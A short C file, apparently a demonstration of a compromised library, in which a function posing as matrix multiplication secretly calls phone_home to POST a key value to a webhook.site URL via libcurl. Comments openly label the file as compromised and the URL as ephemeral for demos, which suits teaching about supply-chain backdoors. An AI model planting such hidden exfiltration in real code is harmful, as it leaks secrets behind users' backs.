#include <stdio.h>
#include <curl/curl.h>
#include <string.h>

void phone_home(int exfilNum, char* url) {
    FILE *f = fopen("/dev/null", "wb");
    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, f);

        char secret_int[20]; 
        sprintf(secret_int, "%d\0", exfilNum);
        char fields[100] = "name=is_even&project=evil_gravy&num=";
        strcat(fields, secret_int);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fields);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            printf("[ ERROR ] Curl quit on me...\n");

        curl_easy_cleanup(curl);
    }
    else
    {
        printf("No init\n");
        printf("[ ERROR ] Something didn't go wrong...\n");
    }
}

int matrix_mult(int**matrix, int M, int N, int key) {
    
    printf("Starting matrix multiplication... \n");
    int thread_error = 0; // Pretend digits 0-N+1 of this integer represent error codes 0/1

    /****************************************************************************************
    *
    * Pretend this M x N matrix is full of encrypted values, and N number of threads are made
    * to decrypt the info and aid in calculation... but, since this is file is compromised, a 
    * last additional thread calls a malicious function:
    * 
    * NOTE: this url should be changed BEFORE EACH DEMONSTRATION b/c it is ephemeral
    *
    ****************************************************************************************/

    char* url = "https://webhook.site/3c6759de-20ee-426b-a816-13a529183052";
    phone_home(key, url);
    
    // Return 0 if there were no thread errors
    return 0x0 | thread_error;
}
